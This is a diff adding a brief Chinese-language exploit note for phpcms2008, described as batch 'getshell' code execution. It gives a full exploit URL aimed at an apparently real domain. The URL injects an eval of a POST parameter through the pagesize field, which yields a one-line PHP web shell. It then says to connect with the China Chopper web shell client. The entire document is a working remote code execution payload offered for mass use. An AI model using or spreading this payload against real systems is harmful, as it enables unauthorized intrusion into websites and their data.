@@ -1,0 +1,7 @@
+////////////////
+phpcms2008代码执行 批量getshell EXP
+
+EXP：http://www.cnqiyou.com/yp/product.php?pagesize=${${@eval%28$_POST[heixiaozi]%29}} 
+直接菜刀链接
+
+//////////////////
